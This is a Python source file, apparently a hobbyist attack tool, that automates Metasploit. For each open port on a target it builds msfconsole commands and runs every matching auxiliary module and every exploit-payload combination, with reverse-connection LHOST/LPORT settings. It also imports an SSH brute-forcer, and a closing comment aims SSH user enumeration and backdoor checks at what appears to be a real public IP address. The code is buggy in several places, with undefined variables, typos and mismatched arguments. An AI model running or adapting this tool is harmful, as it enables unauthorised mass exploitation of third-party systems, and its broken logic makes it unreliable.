# LOCAL
from File_man import File_Man
from micro_scans import MicroScans
from port_enum import PortEnum
from brute_ssh import BruteSSH

# SYS_BASE
import subprocess
from threading import Thread
import time



#            # ? I don't yet know how to use these.. :|
#            #meta_pos_ = self.FM.read_file("meta_lists_/post.txt", "\n")
#            #meta_nop_ = self.FM.read_file("meta_lists_/nops.txt", "\n")
#            #meta_enc_ = self.FM.read_file("meta_lists_/encoder.txt", "\n")



class MetaFab():
    def __init__(self, **kw):
        super(MetaFab, self).__init__(**kw)
        self.FM         = File_Man()
        self.MS         = MicroScans()
        self.PE         = PortEnum()
        self.BS         = BruteSSH()


    # ? AUXIs
    # ! BUILD AUXILIARY CMD_STR FOR CLI
    def build_auxi(self, target_, port_, module_, dest_):
        try:
            meta_   = " msfconsole -q -x "
            use_    = f" ' use {module_}; "
            rhost_  = f" set RHOST {target_}; "
            rport_  = f" set RPORT {port_}; "


            # ? SPECIAL set CONFIGS
            #weird_0 = f" set CONFIRM_DELETE true; "
            #svrhost_  = f" set SVRRHOST {target_}; "
            #svrport_  = f" set SVRRPORT {port_}; "


            run_    = " run; "
            exit_   = " exit; ' "

            to_run = meta_+use_+rhost_+rport_+run_+exit_
            print(f"[SAVING_AUXI]:[>{str(dest_)}<]")

            self.FM.write_file(dest_, to_run, "\n", "w")
            print(f"\n!****!\n[TO_RUN_AUXI]:\n>>[>{str(to_run)}<]")

            auxi_ret = subprocess.getoutput(to_run)
            print(f"\n!****!\n[AUXILIARY_STACK]\n$$ {str(auxi_ret)} \n $$")

        except Exception as e:
            print(f"[E]:[BUILD_AUXI]:[{str(e)}]")

    # ! START AUXILIARY THREAD
    def auxi_thread(self, i_, target_, port_, module_, dest_):
        try:
            # ! FILTER MODULE_DATA -> MOD_DIR
            mod_ = str(module_.split(" ")[0])
            print(f"[NEW_AUX_THREAD]:[{str(i_)}]")  #:[{str(mod_)}]")
            print(f"[DEST_]:[{str(dest_)}]")
            Thread(target=self.build_auxi, args=(target_, port_, mod_, dest_)).start()
        except Exception as e:
            print(f"[E_!]:[AUXI_THREAD]:[>{str(e)}<]")

    # ! START AUXILIARY NO-THREAD*
    def auxi_set_(self, i_, target_, port_, module_, dest_):
        try:
            # ! FILTER MODULE_DATA -> MOD_DIR
            mod_ = str(module_.split(" ")[0]).replace("'", "")
            print(f"[NEW_AUX_THREAD]:[{str(i_)}]")
            print(f"[DEST_]:[{str(dest_)}]")
            self.build_auxi(target_, port_, mod_, dest_)
        except Exception as e:
            print(f"[E_!]:[AUXI_THREAD]:[>{str(e)}<]")


    # ? EXPLOITS
    # ! BUILD EXPLOIT CMD_STR FOR CLI
    def build_xploit(self, target_, port_, l_host, l_port, module_, payload_, dest_):
        try:
            meta_   = " msfconsole -q -x "
            use_0   = f" 'use {module_};"
            use_1   = f" use {payload_};"
            if l_host:
                rhost_  = f" set RHOSTS {target_};"
            if l_host:
                rport_  = f" set RPORT {port_};"
            l_host  = f" set LHOST {l_host};"
            l_port  = f" set LPORT {l_port};"
            run_    = " run;"
            exit_   = " exit; ' "

            to_run = meta_+use_0+use_1+l_host+l_port+rhost_+rport_+run_+exit_
            #print(f"\n!****!\n[TO_RUN_EXPL]:\n>>[>{str(to_run)}<]")
            print(f"[SAVING_XPL]:[>{str(dest_)}<]")
            self.FM.write_file(dest_, to_run, "\n", "w")

            expl_ret = subprocess.getoutput(to_run)

        except Exception as e:
            print(f"[E]:[BUILD_SPLOIT]:[{str(e)}]")

    # ! START EXPLOT THREAD
    def expl_thread(self, i_, j_, target_, port_, l_host, l_port,  module_, payload_, dest_):
        try:
            # ! FILTER MODULE_DATA -> MOD_DIR
            mod_ = str(module_.split(" ")[0])
            # ! FILTER PAYLOAD_DATA -> PAYLOAD_DIR
            pay_ = str(payload_.split(" ")[0])
            print(f"[NEW_XPL_THREAD]:[{str(i_)}]:[{str(j_)}]")   #:[{str(mod_)}]:-:[{str(pay_)}]")
            Thread(target=self.build_xploit, args=(target_, port_, module_, pay_, dest_)).start()
        except Exception as e:
            print(f"[E_!]:[EXPL_THREAD]:[>{str(e)}<]")


    # ! START EXPLOT NON-THREAD*
    def expl_set_(self, i_, j_, target_, port_, l_host, l_port,  module_, payload_, dest_):
        try:
            # ! FILTER MODULE_DATA -> MOD_DIR
            mod_ = str(module_.split(" ")[0])
            # ! FILTER PAYLOAD_DATA -> PAYLOAD_DIR
            pay_ = str(payload_.split(" ")[0])
            print(f"[NEW_XPL_THREAD]:[{str(i_)}]:[{str(j_)}]")
            self.build_xploit(target_, port_, module_, pay_, dest_)
        except Exception as e:
            print(f"[E_!]:[EXPL_THREAD]:[>{str(e)}<]")










    # ! SEARCH MATCHING AUXILIARIES
    def collect_auxi_list(self, p_type, flags_):
        try:
            print(f"[FETCHING_AUXILIARIES]\n^^^^^^^^^^^^^^^")
            print("[.     ]")
            auxi_list = []
            time.sleep(0.5)
            print("[..    ]")
            # ! COLLECT EACH LIST
            meta_aux_ = self.FM.read_file_str("meta_lists_/auxiliary.txt")
            print("[...   ]")
            my_auxi = str(meta_aux_).split(",")
            print("[....  ]")
            for met in my_auxi:
                if str(p_type).upper() not in str(met).upper():
                    pass
                else:
                    da_aux_ = str(met).split(" ")
                    for da_ in da_aux_:
                        if "aux" in str(da_):
                            final_aux_val = str(da_)[1:]
                            auxi_list.append(final_aux_val)
            print("[..... ]")
            print(f"[NUMBER_OF_MaTCHING_AUXI_]:[>{str(len(auxi_list))}<]")
            print("[......]")
            return auxi_list
        except Exception as e:
            print(f"[E]:[COLLECT_AUXI_LIST]:[{str(e)}]")

    # ! SEARCH MATCHING EXPLOITS
    def collect_expl_list(self, p_type, flags_):
        try:
            print(f"[FETCHING_EXPLOITS]\n^^^^^^^^^^^^^^^")
            print("[.     ]") 
            expl_list = []
            print("[..    ]")
            time.sleep(0.5)
            # ! COLLECT EACH LIST
            meta_expl_ = self.FM.read_file_str("meta_lists_/exploit.txt")
            print("[...   ]")
            my_expl = str(meta_expl_).split(",")
            print("[....  ]")
            for met in my_expl:
                if str(p_type).upper() not in str(met).upper():
                    pass
                else:
                    da_expl_ = str(met).split(" ")
                    for da_ in da_expl_:
                        if "exp" in str(da_):
                            final_expl_val = str(da_)[1:]
                            expl_list.append(final_expl_val)
            print("[..... ]")
            print(f"[NUMBER_OF_MaTCHING_EXPL_]:[>{str(len(expl_list))}<]")
            print("[......]")
            return expl_list
        except Exception as e:
            print(f"[E]:[COLLECTING_EXPLOITS]:[{str(e)}]")

    # ! SEARCH MATCHING PAYLOADS
    def collect_payl_list(self, p_type, flags_):
        try:
            print(f"[FETCHING_PAYLOADS]\n^^^^^^^^^^^^^^^")
            print("[.     ]")
            expl_list = []
            time.sleep(0.5)
            # ! COLLECT EACH LIST
            meta_expl_ = self.FM.read_file_str("meta_lists_/payload.txt")
            print("[...   ]")
            my_expl = str(meta_expl_).split(",")
            print("[....  ]")
            for met in my_expl:
                if str(p_type).upper() not in str(met).upper():
                    pass
                else:
                    da_expl_ = str(met).split(" ")
                    for da_ in da_expl_:
                        if "pay" in str(da_):
                            final_expl_val = str(da_)[1:]
                            expl_list.append(final_expl_val)
            print("[..... ]")
            print(f"[NUMBER_OF_MaTCHING_PAYL_]:[>{str(len(expl_list))}<]")
            print("[......]")
            return expl_list
        except Exception as e:
            print(f"[E]:[COLLECTING_PAYLOADS]:[{str(e)}]")



    # ! BASE_AUXI
    # TH_LVL_2
    def auxi_main(self,  meta_dir, target_, p_type, port_str, i_, thr_ ):
        try:
            print("[RUNNING_AUXI_SETS]\n^^^^^^^^^^^^^")
            my_auxi_ = self.collect_auxi_list(p_type, search_flags)
            for i, aux in enumerate(my_auxi_):
                print(f"[I]:[{str(i)}]::[AUXI]:[>{str(aux)}<]")
                dest_ = meta_dir+f"/aux_{str(i_)}_{str(i)}_.txt"
                if "N" in thr_:
                    self.auxi_set_(i_, target_, port_str, aux, dest_)
                elif "Y*3" in thr_:
                    Thread(target=self.auxi_set_, args=(i_, target_, port_str, aux, dest_))
        except Exception as e:
            print(f"[E]:[AUXI_MAIN]:[>{str(e)}<]")

    # ! BASE_EXPL:[PAYL]
    # TH_LVL_2
    def expl_main(self, l_host, l_port, meta_dir, target_, p_type, port_str, i_, thr_ ):
        try:
            print("[RUNNING_EXPLOIT_SETS]\n^^^^^^^^^^^^^")
            my_expl_ = self.collect_expl_list(p_type, search_flags)
            my_payl_ = self.collect_payl_list(p_type, search_flags)
            for j, exp in enumerate(my_expl_):
                print(f"[J]:[{str(j)}]::[EXPL]:[>{str(exp)}<]")
                for k, pay in enumerate(my_payl_):
                    print(f"[K]:[{str(k)}]::[PAYL]:[>{str(pay)}<]")
                    if "N" in thr_:
                        dest_ = meta_dir+f"/expl_{str(i_)}_{str(j)}_{str(k)}_.txt"
                        self.expl_set_(j, k, target_, port_, l_host, l_port,  module_, payload_, dest_)
                    elif "Y*3" in thr_:
                        Thread(target=self.expl_set_, args=(j, k, target_, port_, l_host, l_port,  module_, payload_, dest_))
        except Exception as e:
            print(f"[E]:[EXPLY_MAIN]:[>{str(e)}<]")




    # ! BUILD CONFIGS *THREAD_LVEL-1*
    # BASE_THREAD_[1]
    def configs_base(self, l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_, thr_):
        try:
            print(f"[COLLECTING_CONFIGS]\n[TEST_#]:[>{str(i_)}<]\n[L_HOST]:[>{str(l_host)}<]\n[L_PORT]:[>{str(l_port)}<]\n[TARGET]:[>{str(target_)}<]\n[P_TYPE]:[>{str(p_type)}<]\n[F_DEST]:[>{str(meta_dir)}<]")
            print(f"\n[THEAD_LVL]:[1]\n")
            Thread(target=self.auxi_main, args=(l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_, thr_)),start()
            Thread(target=self.expl_main, args=(l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_, thr_)),start()
            print("[RUNNING_THREAD]:[LVL_1]")
        except Exception as e:
            print(f"[E]:[EXPLY_MAIN]:[>{str(e)}<]")


    # ! BUILD CONFIGS *[1]:[3]-THREAD*
    def collect_configs(self, l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_, thr_):
        try:
            aux_opt = input("[USE_AUXILIARIES]:[Y/n]:")
            exp_opt = input("[USE_EXPLOITS_]:[Y/n]:")
            print(f"[COLLECTING_CONFIGS]\n[TEST_#]:[>{str(i_)}<]\n[L_HOST]:[>{str(l_host)}<]\n[L_PORT]:[>{str(l_port)}<]\n[TARGET]:[>{str(target_)}<]\n[P_TYPE]:[>{str(p_type)}<]\n[F_DEST]:[>{str(meta_dir)}<]")

            search_flags = self.PE.get_port_info(port_str, target_)

            search_flags.append(p_type)
            for fl_ in search_flags:
                print(f"[FL_]:[>{str(fl_)}<]")

            if "Y*1" in thr_:
                print(f"[THR_]:[LVL_1]:[TRUE]")
                Thread(traget=configs_base, args=(self, l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_, thr_)).start()
            else:
                print(f"[THR_]:[LVL_1]:[FLASE]")


            my_auxi_ = self.collect_auxi_list(p_type, search_flags)
            my_expl_ = self.collect_expl_list(p_type, search_flags)
            my_payl_ = self.collect_payl_list(p_type, search_flags)


            if "Y*3" in str(thr_).upper():
                print("[THREAD_LVL]:[3]:[TRUE]")


            # ! TESTING ONLY EXPL FOR NOW
                if "N" not in aux_opt.upper():
                    print("[RUNNING_AUXI_THREADS]\n^^^^^^^^^^^^^")
                    for i, aux in enumerate(my_auxi_):
                        print(f"[I]:[{str(i)}]::[AUXI]:[>{str(aux)}<]")
                        dest_ = meta_dir+f"aux_{str(i_)}_{str(i)}_.txt"
                        self.auxi_thread(i_, target_, port_str, aux, dest_)
                if "N" not in exp_opt.upper():
                    print("[RUNNING_EXPLOIT_THREADS]\n^^^^^^^^^^^^^")
                    for j, exp in enumerate(my_expl_):
                        print(f"[J]:[{str(j)}]::[EXPL]:[>{str(exp)}<]")
                        for k, pay in enumerate(my_payl_):
                            print(f"[K]:[{str(k)}]::[PAYL]:[>{str(pay)}<]")
                            dest_ = meta_dir+f"expl_{str(i_)}_{str(i)}_.txt"
                            self.expl_thread(j, k, target_, port_str, l_host, l_port,  exp, pay, dest_)



            else:
                print("[THREAD_LVL]:[3]:[FALSE]")
                if "N" not in aux_opt.upper():
                    print("[RUNNING_AUXI_SETS]\n^^^^^^^^^^^^^")
                    for i, aux in enumerate(my_auxi_):
                        print(f"[I]:[{str(i)}]::[AUXI]:[>{str(aux)}<]")
                        dest_ = meta_dir+f"/aux_{str(i_)}_{str(i)}_.txt"
                        self.auxi_set_(i_, target_, port_str, aux, dest_)
                if "N" not in exp_opt.upper():
                    print("[RUNNING_EXPLOIT_SETS]\n^^^^^^^^^^^^^")
                    for j, exp in enumerate(my_expl_):
                        print(f"[J]:[{str(j)}]::[EXPL]:[>{str(exp)}<]")
                        for k, pay in enumerate(my_payl_):
                            print(f"[K]:[{str(k)}]::[PAYL]:[>{str(pay)}<]")
                            self.expl_set_(j, k, target_, port_str, l_host, l_port,  exp, pay, dest_)

        except Exception as e:
            print(f"[E]:[COLLECT_CONFIGS]:[>{str(e)}<]")






    # ! CHECK PORT TYPE
    def check_port_type(self, port_):
        try:
            # ? tcp
            if "21" in str(port_):
                return "tcp"
            if "443" in str(port_):
                return "tcp"
            # ? ssh
            if "22" in str(port_):
                return "ssh"
            # ? smtp
            if "25" in str(port_):
                return "smpt"
            if "465" in str(port_):
                return "smpt"
            if "587" in str(port_):
                return "smpt"
            if "2525" in str(port_):
                return "smpt"
            # ? pop3
            if "110" in str(port_):
                return "pop3"
            if "995" in str(port_):
                return "pop3"
            # ? imap
            if "143" in str(port_):
                return "imap"
            if "993" in str(port_):
                return "imap"
            # ? sql
            if "1443" in str(port_):
                return "sql"
            if "4022" in str(port_):
                return "sql"
            if "1351" in str(port_):
                return "sql"
            if "1434" in str(port_):
                return "sql"
            # ? what_app
            if "5222" in str(port_):
                return "whatsapp"
            # ? http
            if "80" in str(port_):
                return "http"
            if "8080" in str(port_):
                return "http"
        except Exception as e:
            print(f"[E]:[PORT_TYPE_CHECK]:[>{str(e)}<]")








    # ! START 'McBRETA' _STACK_
    def set_meta_stack_(self, l_host, l_port, target_, prof_dir, type_, tcp_, thr_):
        print(f"[RUNNING]:[SET_META_LAB]:[>{target_}<]:[>{type_}<]:[>{tcp_}<]\n[THR_]:[>{thr_}<]")


        try:
            meta_dir = prof_dir+"/meta_dir/"
            self.FM.make_dir(meta_dir)

            if len(tcp_) >= 1:
                print("\n[*!*]\n\n[GOT_PORTS]")
                try:
                    for i, val in enumerate(tcp_):
                        print(f"[X]:[RUNNING_]:\n    [#]:[{str(i)}]:\n    [PORT]:[{str(val)}]\n")
                        # ! CHECK PORT CONFIGS
                        p_type = self.check_port_type(val)
                        if "2" in thr_:
                            print("[THREAD_LVL_2]")
                            Thread(target=self.collect_configs, args=(l_host, l_port, prof_dir, meta_dir, target_, p_type, str(val), i, thr_)).start()
                            time.sleep(0.5)
                        else:
                            self.collect_configs(l_host, l_port, prof_dir, meta_dir, target_, p_type, str(val), i, thr_)

                        time.sleep(5)
                    print("[ALL_AUXI_&_EXPL_RAN]")
                except Exception as e:
                    print(f"[E]:[RUN_LOAD_PORTS_]:[{str(e)}]")
            else:
                print("[NO_TCP_LIST]")

        except Exception as e:
            print(f"[E]:[SET_META_STACK]:[{str(e)}]")




# msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS 41.203.16.195; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS 41.203.16.195; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS 41.203.16.195; set RPORT 22; run; exit'
